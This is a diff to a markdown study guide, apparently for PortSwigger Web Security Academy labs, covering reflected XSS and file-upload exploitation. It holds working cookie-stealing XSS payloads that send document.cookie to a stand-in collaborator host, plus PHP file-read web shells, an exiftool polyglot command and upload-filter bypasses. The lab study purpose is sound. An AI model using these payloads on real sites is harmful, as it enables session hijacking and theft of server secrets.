@@ -200,7 +200,7 @@
 >Set a test unsecure cookie in browser dev tools to test POC XSS cookie stealer payload on myself.  
 
 ```JavaScript
-document.cookie = "TopSecret=UnsecureCookieSessionValue4TopSecret007";
+document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 ```  
   
 >Basic XSS Payloads to ***identify*** application controls for handling data received in HTTP request.   
@@ -221,6 +221,8 @@ document.cookie = "TopSecret=UnsecureCookieSessionValue4TopSecret007";
 <iframe src="https://TARGET.web.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
 ```  
   
+### Tags Blocked  
+  
 >Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG markup allowed using above methodology. This payload steal my own session cookie as POC.  
 
 ```
@@ -230,12 +232,41 @@ https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransfo
 >Place the above payload on exploit server and insert URL with search value into an **iframe** before delivering to victim in below code block.  
 
 ```html
-<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.com%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E"></iframe>
+<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.com%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
+</iframe>
 ```  
   
 ![svg animatetransform XSS](images/svg-animatetransform-xss.png)  
   
 [PortSwigger Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)  
+  
+### Custom Tags not Blocked  
+  
+>Another application also respond with message ***"Tag is not allowed"*** when attempting to insert XSS script, but if we create custom tag it is bypassed.  
+
+```
+<xss+id=x>#x';
+```  
+
+***Identify*** if above custom tag is not block in search function, by observing the response. Create below payload to steal session cookie out-of-band.  
+
+```
+<script>
+location='https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://Collaborator.COM/?c='+document.cookie tabindex=1>#x';
+</script>
+```
+   
+>Hosted payload script on exploit server in an **iframe**, and send to victim. Below is the above payload but URL-encoded format.  
+
+```
+<script>
+location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
+</script>
+```  
+
+![Custom XSS tag](images/custom-xss-tag.png)  
+  
+[PortSwigger Lab: Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)  
   
 ### XSS Tags & Events  
 
@@ -1784,7 +1815,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 ![Identify file upload](images/file-upload.png)  
 
->A simple bypass technique is to specify **Content-Type** to value of ```image/jpeg``` and then uploading exploit.php file with the below payload. Content of exploit php will read the ```/home/carlos/secret``` sensitive information.  
+>A simple bypass technique is to specify **Content-Type** to value of ```image/jpeg``` and then uploading exploit.php file with the below payload. The code of the exploit.php file below will read the ```/home/carlos/secret``` sensitive information.  
 
 ```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
@@ -1794,7 +1825,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
   
 1. Upload the file name and include obfuscated path traversal ```..%2fexploit.php``` and retrieve the content ```GET /files/avatars/..%2fexploit.php```  
 2. Upload a file named, ```exploit.php%00.jpg``` with trailing null character and get the file execution at ```/files/avatars/exploit.php```  
-3. Create polygot using valid image file, and running the command: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. To view the extracted data, issue Get request to ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain exfiltrated sensitive data.  
+3. Create polygot using valid image file, by running the command in bash terminal: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. Once polygot uploaded, view the extracted data by issue a GET request to the uploaded path ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain exfiltrated sensitive data.  
 4. Upload two files, first ***.htaccess*** with content ```AddType application/x-httpd-php .l33t``` allowing then the upload and execute of second file named, ```exploit.l33t```  
   
 >Matching file upload vulnerable labs:  
@@ -1807,7 +1838,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 ### XXE via SVG Image upload  
 
->***Identify*** image upload on the blog post function accept **svg** images, and observe that the avatars already on blog source code is **svg** extensions.  
+>***Identify*** image upload on the blog post function that accept **svg** images, and observe that the avatars already on blog source code is **svg** extensions.  
 
 >The content of the image.svg file uploaded:  
 
